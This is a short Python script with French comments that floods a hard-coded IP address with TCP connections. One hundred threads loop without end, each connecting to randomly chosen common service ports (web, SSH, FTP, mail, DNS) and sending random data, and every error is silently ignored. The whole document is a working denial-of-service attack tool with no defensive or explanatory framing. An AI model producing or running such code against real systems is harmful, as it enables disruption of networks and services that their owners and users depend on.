import os
import threading
import socket
import random

# Adresse IP de la machine cible
target_ip = "192.168.1.100"

# Port de la machine cible
target_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995]

# Nombre de connexions par thread
connections_per_thread = 1000

# Nombre de threads
threads = 100

# Fonction de connexion
def attack():
    while True:
        try:
            # Création d'une socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Choix aléatoire d'un port
            target_port = random.choice(target_ports)
            
            # Connexion à la machine cible
            s.connect((target_ip, target_port))
            
            # Envoi de données aléatoires
            data = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=1024))
            s.send(data.encode())
            
            # Fermeture de la socket
            s.close()
            
        except:
            pass

# Création des threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.start()